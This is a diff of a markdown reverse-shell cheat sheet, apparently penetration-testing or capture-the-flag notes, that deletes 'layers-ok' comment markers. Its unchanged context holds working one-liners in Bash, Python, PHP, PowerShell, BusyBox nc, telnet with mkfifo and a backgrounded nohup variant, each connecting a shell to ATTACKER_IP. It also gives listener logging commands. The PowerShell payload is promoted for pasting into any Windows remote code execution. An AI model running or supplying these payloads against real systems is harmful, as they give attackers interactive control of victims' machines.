@@ -49,7 +49,6 @@ All of these follow one model: connect to the attacker, wire stdin/stdout/stderr
 
 ### Bash
 
-<!-- layers-ok -->
 ```bash
 bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
 ```
@@ -59,7 +58,6 @@ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
 
 ### Python
 
-<!-- layers-ok -->
 ```bash
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
 ```
@@ -69,7 +67,6 @@ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443)
 
 ### PHP
 
-<!-- layers-ok -->
 ```bash
 php -r '$s=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
 ```
@@ -81,7 +78,6 @@ php -r '$s=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
 
 The one that matters on Windows: no file to upload, no `nc.exe` to smuggle across. Paste it into an RDP session, a `cmd.exe` window, or any Windows RCE.
 
-<!-- layers-ok -->
 ```powershell
 $c=New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
 ```
@@ -92,12 +88,10 @@ $c=New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",443);$s=$c.GetStream();
 
 ### BusyBox and Telnet fallbacks
 
-<!-- layers-ok -->
 ```bash
 busybox nc ATTACKER_IP 443 -e sh
 ```
 
-<!-- layers-ok -->
 ```bash
 TF=$(mktemp -u); mkfifo "$TF" && telnet ATTACKER_IP 443 0<"$TF" | sh 1>"$TF"
 ```
@@ -106,7 +100,6 @@ TF=$(mktemp -u); mkfifo "$TF" && telnet ATTACKER_IP 443 0<"$TF" | sh 1>"$TF"
 
 ### Backgrounding
 
-<!-- layers-ok -->
 ```bash
 bash -c 'nohup bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &'
 ```
@@ -139,14 +132,12 @@ script ~/loot/<box>/<box>.log
 
 Two scoped alternatives that log only the reverse-shell connection:
 
-<!-- layers-ok -->
 ```bash
 nc -lvnp 4444 | tee ~/loot/<box>/shell.log
 ```
 
 - `tee` writes what arrives to file **and** screen. Records the shell's output only, not your typing. Safe on a raw shell; do **not** use it after a PTY upgrade — `stty raw -echo` hands the terminal to the remote side and the pipe breaks the interaction.
 
-<!-- layers-ok -->
 ```bash
 script -q -c "nc -lvnp 4444" ~/loot/<box>/shell.log
 ```
@@ -181,7 +172,6 @@ Reverse: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 
 
 ### Plain shells
 
-<!-- layers-ok -->
 ```bash
 # reverse — attacker listens, target connects back with a shell attached
 ncat -lvnp 4444
